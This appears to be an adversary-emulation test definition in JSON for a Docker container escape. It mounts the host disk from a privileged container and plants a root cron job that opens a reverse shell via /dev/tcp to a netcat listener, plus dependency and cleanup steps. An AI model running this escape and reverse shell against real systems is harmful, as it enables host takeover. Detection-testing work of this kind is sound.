{
  "id": "6c499943-b098-4bc6-8d38-0956fc182984",
  "name": "Mount host filesystem to escape privileged Docker container",
  "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
  "platforms": [
    "containers"
  ],
  "steps": [
    {
      "id": "580004ca-e032-4e5c-bf6f-8cb1a2789063",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" \u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" \u003e\u0026 /dev/tcp/#{listen_address}/#{listen_port} 0\u003e\u00261'\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2\u003e\u00261\n",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "a58f8112-3d88-48b2-8ac6-15fc8f933a57",
      "type": "execute-command",
      "data": {
        "command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}\n",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "83e1162a-aa61-4fbc-9181-21540145d03e",
      "name": "Check dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "which mount\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "515ff4aa-641c-4e6f-9662-44e4388e18c2",
      "name": "Resolve dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "f5ae4252-0042-4e62-862c-3331ff86454a",
      "name": "Re-check dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "which mount\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "a48a93bb-47a1-4907-9582-7ad28bc12b9f",
      "name": "Check dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "capsh --print | grep cap_sys_admin\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "c5fd3dbf-4fc5-485b-9e43-9a2245d809d2",
      "name": "Resolve dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "ee5f5106-04a0-486b-8402-fb1de8d59189",
      "name": "Re-check dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "capsh --print | grep cap_sys_admin\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "08b88982-e3e0-48f6-bf73-6b0288b28303",
      "name": "Check dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "ls #{mount_device}\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "0abb917c-0ba7-4560-93bf-ccc751b36277",
      "name": "Resolve dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "c5e41a6f-68e6-4b3a-adf3-9fc7364fad32",
      "name": "Re-check dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "ls #{mount_device}\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "60923d50-799e-49bc-8803-9e24bf709cca",
      "name": "Check dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "which netcat\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "97a4eb8e-5e79-470c-93c6-46788686ca19",
      "name": "Resolve dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "9acfdce7-3951-446e-89c5-08198980024c",
      "name": "Re-check dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "which netcat\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "3cc4525d-0ec7-4479-a3c6-0bb3e483dede",
      "name": "Check dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "73a25d70-f193-4f26-ad05-048e8388d103",
      "name": "Resolve dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "e2b7ec2a-939e-4998-be8a-0caaba337357",
      "name": "Re-check dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
        "command_type": ""
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "580004ca-e032-4e5c-bf6f-8cb1a2789063",
      "p": "on-success",
      "o": "a58f8112-3d88-48b2-8ac6-15fc8f933a57"
    },
    {
      "s": "580004ca-e032-4e5c-bf6f-8cb1a2789063",
      "p": "on-failure",
      "o": "a58f8112-3d88-48b2-8ac6-15fc8f933a57"
    },
    {
      "s": "83e1162a-aa61-4fbc-9181-21540145d03e",
      "p": "on-success",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "83e1162a-aa61-4fbc-9181-21540145d03e",
      "p": "on-failure",
      "o": "515ff4aa-641c-4e6f-9662-44e4388e18c2"
    },
    {
      "s": "515ff4aa-641c-4e6f-9662-44e4388e18c2",
      "p": "on-success",
      "o": "f5ae4252-0042-4e62-862c-3331ff86454a"
    },
    {
      "s": "f5ae4252-0042-4e62-862c-3331ff86454a",
      "p": "on-failure",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "a48a93bb-47a1-4907-9582-7ad28bc12b9f",
      "p": "on-success",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "a48a93bb-47a1-4907-9582-7ad28bc12b9f",
      "p": "on-failure",
      "o": "c5fd3dbf-4fc5-485b-9e43-9a2245d809d2"
    },
    {
      "s": "c5fd3dbf-4fc5-485b-9e43-9a2245d809d2",
      "p": "on-success",
      "o": "ee5f5106-04a0-486b-8402-fb1de8d59189"
    },
    {
      "s": "ee5f5106-04a0-486b-8402-fb1de8d59189",
      "p": "on-failure",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "08b88982-e3e0-48f6-bf73-6b0288b28303",
      "p": "on-success",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "08b88982-e3e0-48f6-bf73-6b0288b28303",
      "p": "on-failure",
      "o": "0abb917c-0ba7-4560-93bf-ccc751b36277"
    },
    {
      "s": "0abb917c-0ba7-4560-93bf-ccc751b36277",
      "p": "on-success",
      "o": "c5e41a6f-68e6-4b3a-adf3-9fc7364fad32"
    },
    {
      "s": "c5e41a6f-68e6-4b3a-adf3-9fc7364fad32",
      "p": "on-failure",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "60923d50-799e-49bc-8803-9e24bf709cca",
      "p": "on-success",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "60923d50-799e-49bc-8803-9e24bf709cca",
      "p": "on-failure",
      "o": "97a4eb8e-5e79-470c-93c6-46788686ca19"
    },
    {
      "s": "97a4eb8e-5e79-470c-93c6-46788686ca19",
      "p": "on-success",
      "o": "9acfdce7-3951-446e-89c5-08198980024c"
    },
    {
      "s": "9acfdce7-3951-446e-89c5-08198980024c",
      "p": "on-failure",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "3cc4525d-0ec7-4479-a3c6-0bb3e483dede",
      "p": "on-success",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    },
    {
      "s": "3cc4525d-0ec7-4479-a3c6-0bb3e483dede",
      "p": "on-failure",
      "o": "73a25d70-f193-4f26-ad05-048e8388d103"
    },
    {
      "s": "73a25d70-f193-4f26-ad05-048e8388d103",
      "p": "on-success",
      "o": "e2b7ec2a-939e-4998-be8a-0caaba337357"
    },
    {
      "s": "e2b7ec2a-939e-4998-be8a-0caaba337357",
      "p": "on-failure",
      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
    }
  ],
  "tags": [
    "T1611"
  ],
  "input_arguments": [
    {
      "name": "mount_device",
      "type": "path",
      "description": "Path to the device of the host's disk to mount",
      "value": "/dev/dm-0"
    },
    {
      "name": "mount_point",
      "type": "path",
      "description": "Path where the host filesystem will be mounted",
      "value": "/mnt/T1611.002"
    },
    {
      "name": "cron_path",
      "type": "path",
      "description": "Path on the host filesystem where cron jobs are stored",
      "value": "/etc/cron.d"
    },
    {
      "name": "cron_filename",
      "type": "string",
      "description": "Filename of the cron job in cron_path",
      "value": "T1611_002"
    },
    {
      "name": "listen_address",
      "type": "string",
      "description": "IP address to listen for callback from the host system.",
      "value": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
    },
    {
      "name": "listen_port",
      "type": "integer",
      "description": "TCP Port to listen on for callback from the host system.",
      "value": "4444"
    }
  ]
}